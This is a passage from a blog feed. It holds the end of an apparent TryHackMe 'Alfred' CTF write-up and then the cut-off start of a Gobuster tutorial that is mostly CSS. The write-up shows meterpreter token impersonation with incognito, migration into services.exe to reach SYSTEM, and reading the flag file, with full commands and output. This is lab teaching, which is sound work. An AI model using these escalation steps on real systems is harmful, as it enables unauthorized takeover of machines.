<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
<span style="color:#f92672">===============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>
SeIncreaseQuotaPrivilege        Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
PS C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject&gt; 

</code></pre></div><p>We get that <strong>SeDebugPrivilege</strong> and <strong>SeImpersonatePrivilege</strong> are <strong>Enabled.</strong> Just what we need.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SeDebugPrivilege                Debug programs                            Enabled 
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
</code></pre></div><p>Back to our <strong>meterpreter</strong> reverse shell, let&rsquo;s load the <strong>incognito</strong> module that would let us exploit those privileges. Then we run <strong>list_tokens -g</strong> to see the available tokens.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; load incognito
Loading extension incognito...Success.
meterpreter &gt; list_tokens -g
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self <span style="color:#66d9ef">if</span> primary process token is SYSTEM

Delegation Tokens Available
<span style="color:#f92672">========================================</span>
<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>BUILTIN<span style="color:#ae81ff">\A</span>dministrators
BUILTIN<span style="color:#ae81ff">\I</span>IS_IUSRS
BUILTIN<span style="color:#ae81ff">\U</span>sers
NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users
NT AUTHORITY<span style="color:#ae81ff">\N</span>TLM Authentication
NT AUTHORITY<span style="color:#ae81ff">\S</span>ERVICE
NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization
NT AUTHORITY<span style="color:#ae81ff">\W</span>RITE RESTRICTED
NT SERVICE<span style="color:#ae81ff">\A</span>ppHostSvc
NT SERVICE<span style="color:#ae81ff">\A</span>udioEndpointBuilder
NT SERVICE<span style="color:#ae81ff">\B</span>FE
NT SERVICE<span style="color:#ae81ff">\C</span>ertPropSvc
NT SERVICE<span style="color:#ae81ff">\C</span>scService
NT SERVICE<span style="color:#ae81ff">\D</span>nscache
NT SERVICE<span style="color:#ae81ff">\e</span>ventlog
NT SERVICE<span style="color:#ae81ff">\E</span>ventSystem
NT SERVICE<span style="color:#ae81ff">\F</span>DResPub
NT SERVICE<span style="color:#ae81ff">\i</span>phlpsvc
NT SERVICE<span style="color:#ae81ff">\L</span>anmanServer
NT SERVICE<span style="color:#ae81ff">\M</span>MCSS
NT SERVICE<span style="color:#ae81ff">\P</span>caSvc
NT SERVICE<span style="color:#ae81ff">\P</span>lugPlay
NT SERVICE<span style="color:#ae81ff">\R</span>pcEptMapper
NT SERVICE<span style="color:#ae81ff">\S</span>chedule
NT SERVICE<span style="color:#ae81ff">\S</span>ENS
NT SERVICE<span style="color:#ae81ff">\S</span>essionEnv
NT SERVICE<span style="color:#ae81ff">\S</span>pooler
NT SERVICE<span style="color:#ae81ff">\T</span>rkWks
NT SERVICE<span style="color:#ae81ff">\U</span>mRdpService
NT SERVICE<span style="color:#ae81ff">\U</span>xSms
NT SERVICE<span style="color:#ae81ff">\W</span>inDefend
NT SERVICE<span style="color:#ae81ff">\W</span>inmgmt
NT SERVICE<span style="color:#ae81ff">\W</span>Search
NT SERVICE<span style="color:#ae81ff">\w</span>uauserv

Impersonation Tokens Available
<span style="color:#f92672">========================================</span>
NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK
NT SERVICE<span style="color:#ae81ff">\A</span>udioSrv
NT SERVICE<span style="color:#ae81ff">\C</span>ryptSvc
NT SERVICE<span style="color:#ae81ff">\D</span>comLaunch
NT SERVICE<span style="color:#ae81ff">\D</span>hcp
NT SERVICE<span style="color:#ae81ff">\D</span>PS
NT SERVICE<span style="color:#ae81ff">\L</span>anmanWorkstation
NT SERVICE<span style="color:#ae81ff">\l</span>mhosts
NT SERVICE<span style="color:#ae81ff">\M</span>psSvc
NT SERVICE<span style="color:#ae81ff">\n</span>etprofm
NT SERVICE<span style="color:#ae81ff">\N</span>laSvc
NT SERVICE<span style="color:#ae81ff">\n</span>si
NT SERVICE<span style="color:#ae81ff">\P</span>olicyAgent
NT SERVICE<span style="color:#ae81ff">\P</span>ower
NT SERVICE<span style="color:#ae81ff">\S</span>hellHWDetection
NT SERVICE<span style="color:#ae81ff">\T</span>ermService
NT SERVICE<span style="color:#ae81ff">\W</span>32Time
NT SERVICE<span style="color:#ae81ff">\W</span>diServiceHost
NT SERVICE<span style="color:#ae81ff">\W</span>inHttpAutoProxySvc
NT SERVICE<span style="color:#ae81ff">\w</span>scsvc

meterpreter &gt; 
</code></pre></div><p>We can see that the token <strong>BUILTIN\Administrators</strong> is available. Let&rsquo;s impersonate that token by running the following in our <strong>meterpreter</strong> session.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; impersonate_token <span style="color:#e6db74">&#34;BUILTIN\Administrators&#34;</span>
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self <span style="color:#66d9ef">if</span> primary process token is SYSTEM
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Delegation token available
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully impersonated user NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
meterpreter &gt; 
</code></pre></div><p>Once the impersonation is done we type another command to get the UID:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
Server username: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
</code></pre></div><p>As we can see we successfully managed to impersonate <strong>NT AUTHORITY\SYSTEM</strong>.</p>
<p>Now we can answer the room&rsquo;s question:</p>
<blockquote>
<p>Question #3: What is the output when you run the <em>getuid</em> command?</p>
</blockquote>
<p>Even though we managed to impersonate successfully, this actually won&rsquo;t allow us to fully have the permissions of a privileged  user. So, we need to fix that.</p>
<p>We can try to migrate our process to any other that is running with higher privileges, for that we&rsquo;ll use the <strong>ps</strong> command to get the list of running processes and identify one that suits our needs and finally <strong>migrate PID</strong> to migrate to such process.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; ps

Process List
<span style="color:#f92672">============</span>

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#f92672">[</span>System Process<span style="color:#f92672">]</span>                                                   
 <span style="color:#ae81ff">4</span>     <span style="color:#ae81ff">0</span>     System                x64   <span style="color:#ae81ff">0</span>                                      
 <span style="color:#ae81ff">396</span>   <span style="color:#ae81ff">4</span>     smss.exe              x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>mss.exe
 <span style="color:#ae81ff">524</span>   <span style="color:#ae81ff">516</span>   csrss.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
 <span style="color:#ae81ff">572</span>   <span style="color:#ae81ff">564</span>   csrss.exe             x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>srss.exe
 <span style="color:#ae81ff">580</span>   <span style="color:#ae81ff">516</span>   wininit.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>ininit.exe
 <span style="color:#ae81ff">608</span>   <span style="color:#ae81ff">564</span>   winlogon.exe          x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\w</span>inlogon.exe
 <span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">580</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe
 <span style="color:#ae81ff">676</span>   <span style="color:#ae81ff">580</span>   lsass.exe             x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sass.exe
 <span style="color:#ae81ff">684</span>   <span style="color:#ae81ff">580</span>   lsm.exe               x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\l</span>sm.exe
 <span style="color:#ae81ff">776</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">792</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">852</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">924</span>   <span style="color:#ae81ff">608</span>   LogonUI.exe           x64   <span style="color:#ae81ff">1</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\L</span>ogonUI.exe
 <span style="color:#ae81ff">944</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">992</span>   <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1016</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1076</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1188</span>  <span style="color:#ae81ff">668</span>   spoolsv.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>poolsv.exe
 <span style="color:#ae81ff">1220</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1236</span>  <span style="color:#ae81ff">524</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
 <span style="color:#ae81ff">1328</span>  <span style="color:#ae81ff">668</span>   amazon-ssm-agent.exe  x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\S</span>SM<span style="color:#ae81ff">\a</span>mazon-ssm-agent.exe
 <span style="color:#ae81ff">1436</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1480</span>  <span style="color:#ae81ff">668</span>   LiteAgent.exe         x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\X</span>entools<span style="color:#ae81ff">\L</span>iteAgent.exe
 <span style="color:#ae81ff">1508</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1612</span>  <span style="color:#ae81ff">2160</span>  powershell.exe        x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\W</span>indowsPowerShell<span style="color:#ae81ff">\v</span>1.0<span style="color:#ae81ff">\p</span>owershell.exe
 <span style="color:#ae81ff">1652</span>  <span style="color:#ae81ff">668</span>   jenkins.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\j</span>enkins.exe
 <span style="color:#ae81ff">1744</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1820</span>  <span style="color:#ae81ff">1652</span>  java.exe              x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\j</span>re<span style="color:#ae81ff">\b</span>in<span style="color:#ae81ff">\j</span>ava.exe
 <span style="color:#ae81ff">1860</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe
 <span style="color:#ae81ff">1912</span>  <span style="color:#ae81ff">524</span>   conhost.exe           x64   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onhost.exe
 <span style="color:#ae81ff">2160</span>  <span style="color:#ae81ff">1820</span>  cmd.exe               x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWOW64<span style="color:#ae81ff">\c</span>md.exe
 <span style="color:#ae81ff">2184</span>  <span style="color:#ae81ff">668</span>   SearchIndexer.exe     x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\S</span>earchIndexer.exe
 <span style="color:#ae81ff">2244</span>  <span style="color:#ae81ff">668</span>   taskhost.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\L</span>OCAL SERVICE    C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\t</span>askhost.exe
 <span style="color:#ae81ff">2664</span>  <span style="color:#ae81ff">1612</span>  payload.exe           x86   <span style="color:#ae81ff">0</span>        alfred<span style="color:#ae81ff">\b</span>ruce                  C:<span style="color:#ae81ff">\P</span>rogram Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span><span style="color:#ae81ff">\J</span>enkins<span style="color:#ae81ff">\w</span>orkspace<span style="color:#ae81ff">\p</span>roject<span style="color:#ae81ff">\p</span>ayload.exe
 <span style="color:#ae81ff">2972</span>  <span style="color:#ae81ff">668</span>   sppsvc.exe            x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE  C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ppsvc.exe
 <span style="color:#ae81ff">3008</span>  <span style="color:#ae81ff">668</span>   svchost.exe           x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>vchost.exe

</code></pre></div><p>The room itself recommends us to use <strong>services.exe</strong> process:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ae81ff">668</span>   <span style="color:#ae81ff">580</span>   services.exe          x64   <span style="color:#ae81ff">0</span>        NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM           C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\s</span>ervices.exe

</code></pre></div><p>The first numeric value corresponds to the <strong>PID</strong> process ID. So let&rsquo;s migrate!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; migrate <span style="color:#ae81ff">668</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating from <span style="color:#ae81ff">2664</span> to 668...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migration completed successfully.
meterpreter &gt; 
</code></pre></div><p>Yay! we did it, we migrated to a privileged process successfully.</p>
<p>Let&rsquo;s see what is the last question or objective of this room</p>
<blockquote>
<p>Question #5: <strong>read the root.txt file at C:\Windows\System32\config</strong></p>
</blockquote>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; shell
Process <span style="color:#ae81ff">2728</span> created.
Channel <span style="color:#ae81ff">1</span> created.
Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;cd config
cd config

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig&gt;type root.txt
type root.txt
<span style="color:#f92672">{</span>THIS IS THE FLAG VALUE<span style="color:#f92672">}</span>

C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\c</span>onfig&gt;

</code></pre></div><p>And that&rsquo;s all there is to this room. I hope you find this useful, I tried to detail pretty much every step I took to solve the room. I&rsquo;m sure there is some other ways to go about solving this room, I tried to operate within my noob-level expertise and I think the end result could prove appealing to other noob-level ethical hackers out there.</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>    
    </div>
    
</div>

]]></content>
        </item>
        
        <item>
            <title>Gobuster_basics.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/gobuster/</link>
            <pubDate>Sat, 15 Aug 2020 21:25:53 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/gobuster/</guid>
            <description>#GoBuster Basic usage# GoBuster brute-force tool for URIs (directories and files), DNS subdomains and virtual host names.
 Get GoBuster: If you need to download this tool to your system, visit this link  To start with the basic usage for this tool, let&amp;rsquo;s review some of the flags we can specify to run gobuster.
 .table { width: 100%; margin-bottom: 1rem; color: #212529 } .table td, .table th { padding: .</description>
            <content type="html"><![CDATA[<h2 id="gobuster-basic-usage">#GoBuster Basic usage#</h2>
<p>GoBuster brute-force tool for URIs (directories and files), DNS subdomains and virtual host names.</p>
<ul>
<li><strong>Get GoBuster</strong>: If you need to download this tool to your system, <a href="https://github.com/OJ/gobuster">visit this link</a></li>
</ul>
<p>To start with the basic usage for this tool, let&rsquo;s review some of the flags we can specify to run gobuster.</p>
<style>
    .table {
    width: 100%;
    margin-bottom: 1rem;
    color: #212529
}

.table td,
.table th {
    padding: .75rem;
    vertical-align: top;
    border-top: 1px solid #dee2e6
}

.table thead th {
    vertical-align: bottom;
    border-bottom: 2px solid #dee2e6
}

.table tbody+tbody {
    border-top: 2px solid #dee2e6
}

.table-sm td,
.table-sm th {
    padding: .3rem
}

.table-bordered {
    border: 1px solid #dee2e6
}

.table-bordered td,
.table-bordered th {
    border: 1px solid #dee2e6
}

.table-bordered thead td,
.table-bordered thead th {
    border-bottom-width: 2px
}

.table-borderless tbody+tbody,
.table-borderless td,
.table-borderless th,
.table-borderless thead th {
    border: 0
}

.table-striped tbody tr:nth-of-type(odd) {
    background-color: rgba(0, 0, 0, .05)
}

.table-hover tbody tr:hover {
    color: #212529;
    background-color: rgba(0, 0, 0, .075)
}

.table-primary,
.table-primary>td,
.table-primary>th {
    background-color: #b8daff
}

.table-primary tbody+tbody,
.table-primary td,
.table-primary th,
.table-primary thead th {
    border-color: #7abaff
}

.table-hover .table-primary:hover {
    background-color: #9fcdff
}

.table-hover .table-primary:hover>td,
.table-hover .table-primary:hover>th {
    background-color: #9fcdff
}

.table-secondary,
.table-secondary>td,
.table-secondary>th {
    background-color: #d6d8db
}

.table-secondary tbody+tbody,
.table-secondary td,
.table-secondary th,
.table-secondary thead th {
    border-color: #b3b7bb
}

.table-hover .table-secondary:hover {
    background-color: #c8cbcf
}

.table-hover .table-secondary:hover>td,
.table-hover .table-secondary:hover>th {
    background-color: #c8cbcf
}

.table-success,
.table-success>td,
.table-success>th {
    background-color: #c3e6cb
}

.table-success tbody+tbody,
.table-success td,
.table-success th,
.table-success thead th {
    border-color: #8fd19e
}

.table-hover .table-success:hover {
    background-color: #b1dfbb
}

.table-hover .table-success:hover>td,
.table-hover .table-success:hover>th {
    background-color: #b1dfbb
}

.table-info,
.table-info>td,
.table-info>th {
    background-color: #bee5eb
}

.table-info tbody+tbody,
.table-info td,
.table-info th,
.table-info thead th {
    border-color: #86cfda
}

.table-hover .table-info:hover {
    background-color: #abdde5
}

.table-hover .table-info:hover>td,
.table-hover .table-info:hover>th {
    background-color: #abdde5
}

.table-warning,
.table-warning>td,
.table-warning>th {
    background-color: #ffeeba
}

.table-warning tbody+tbody,
.table-warning td,
.table-warning th,
.table-warning thead th {
    border-color: #ffdf7e
}

.table-hover .table-warning:hover {
    background-color: #ffe8a1
}

.table-hover .table-warning:hover>td,
.table-hover .table-warning:hover>th {
    background-color: #ffe8a1
}

.table-danger,
.table-danger>td,
.table-danger>th {
    background-color: #f5c6cb
}

.table-danger tbody+tbody,
.table-danger td,
.table-danger th,
.table-danger thead th {
    border-color: #ed969e
}

.table-hover .table-danger:hover {
    background-color: #f1b0b7
}

.table-hover .table-danger:hover>td,
.table-hover .table-danger:hover>th {
    background-color: #f1b0b7
}

.table-light,
.table-light>td,
.table-light>th {
    background-color: #fdfdfe
}

.table-light tbody+tbody,
.table-light td,
.table-light th,
.table-light thead th {
    border-color: #fbfcfc
}

.table-hover .table-light:hover {
    background-color: #ececf6
}

.table-hover .table-light:hover>td,
.table-hover .table-light:hover>th {
    background-color: #ececf6
}

.table-dark,
.table-dark>td,
.table-dark>th {
    background-color: #c6c8ca
}

.table-dark tbody+tbody,
.table-dark td,
.table-dark th,
.table-dark thead th {
    border-color: #95999c
}

.table-hover .table-dark:hover {
    background-color: #b9bbbe
}

.table-hover .table-dark:hover>td,
.table-hover .table-dark:hover>th {
    background-color: #b9bbbe
}

.table-active,
.table-active>td,
.table-active>th {
    background-color: rgba(0, 0, 0, .075)
}

.table-hover .table-active:hover {
    background-color: rgba(0, 0, 0, .075)
}

.table-hover .table-active:hover>td,
.table-hover .table-active:hover>th {
    background-color: rgba(0, 0, 0, .075)
}

.table .thead-dark th {
    color: #fff;
    background-color: #343a40;
    border-color: #454d55
}

.table .thead-light th {
    color: #495057;
    background-color: #e9ecef;
    border-color: #dee2e6
}

.table-dark {
    color: #fff;
    background-color: #343a40
}

.table-dark td,
.table-dark th,
.table-dark thead th {
    border-color: #454d55
}

.table-dark.table-bordered {
    border: 0
}

.table-dark.table-striped tbody tr:nth-of-type(odd) {
    background-color: rgba(255, 255, 255, .05)
}

.table-dark.table-hover tbody tr:hover {
    color: #fff;
    background-color: rgba(255, 255, 255, .075)
}

@media (max-width:575.98px) {
